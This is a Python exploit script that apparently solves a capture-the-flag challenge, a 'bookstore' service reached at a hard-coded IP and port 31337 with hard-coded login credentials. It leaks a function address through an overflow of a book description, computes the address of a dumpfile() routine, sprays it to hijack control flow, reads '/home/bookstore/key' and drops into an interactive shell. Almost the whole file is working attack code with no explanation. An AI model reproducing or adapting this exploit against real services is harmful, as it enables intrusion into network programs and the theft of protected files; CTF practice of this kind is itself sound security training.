import abc, subprocess, os, sys, socket, telnetlib

class Communication(object):

    @abc.abstractmethod
    def send(self, data):
        return

    @abc.abstractmethod
    def read(self, length):
        return

    @abc.abstractmethod
    def connect_shell(self):
        return

    def read_until(self, match):
        data = ""
        while match not in data:
            data += self.read(1)

        return data

class Process(Communication):
    def __init__(self, file_path, args=[]):
        """ args are currently unused """
        self.p = subprocess.Popen(file_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    def send(self, data):
        self.p.stdin.write(data)
        self.p.stdin.flush()

    def read(self, length):
        """ BLOCKS until length bytes are read! """
        return self.p.stdout.read(length)

    def connect_shell(self):
        """
        Unimplemented.
        """
        pass

class Socket(Communication):

    def __init__(self, target, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((target, port))

    def send(self, data):
        self.sock.send(data)

    def read(self, length):
        return self.sock.recv(length)

    def connect_shell(self):
        t = telnetlib.Telnet()
        t.sock = self.sock
        t.interact()


import struct, os, sys, time

user = "helloadmin"
passw = "iulover!@#$"

server = "54.65.201.110"
#server = 'localhost'
port = 31337

s = Socket(server, port)

def p(x):
  return struct.pack("I", x)

def u(x):
  return struct.unpack("I",x)[0]

def send(m, pad=None):
  if pad is None:
    m+="\n"
  else:
    m += m + "\x00"*(pad - len(m))
  s.send(m)
  time.sleep(0.2)

def login():
  s.send(user)
  time.sleep(1)
  s.send(passw)
  time.sleep(1)

def add_book(name, desc, typ, maxd):
  send("1")
  send(name)
  send(desc)
  send(str(typ))
  if typ == 1:
    send(str(maxd))

def modify_book(book_no, stock, price, free, maxd, avail, name, desc):
  send("2")
  send(str(book_no))
  send("3")
  send(str(stock))
  send(str(price))
  send(str(free))
  send(str(maxd))
  send(str(avail))
  send(name, 0x14)
  send(desc, 0x12c)
  send("0")

def list_books(read=False):
  send('4')
  if read: return s.read(4096)

def leak_addr():
  add_book("a","a",1,1)
  modify_book(0, 0x41414141,0x41414141,0,1,1,"a"*0x14,"a")
  list_books()
  s.read_until("AAAAAAAA") # skip the item
  res = s.read_until(" ")[:-1]
  addr = u(res)

  s.read(1024) # empty buffer
  return addr

raw_input()
login()
time.sleep(.3)
print_description_addr = leak_addr()

dumpfile = print_description_addr + (0x8DB - 0x9AD)
print "dumpfile() address:", hex(dumpfile)
add_book("foo", "bar", 0, 0)
send("2")
send("1")
send("2\n3\n1\n1\n0\n1\n4\n1\n0\n3\n1")
s.send(struct.pack("<I", dumpfile) * 750)
time.sleep(0.2)
send("/home/bookstore/key\0")
send("BBB")

s.connect_shell()

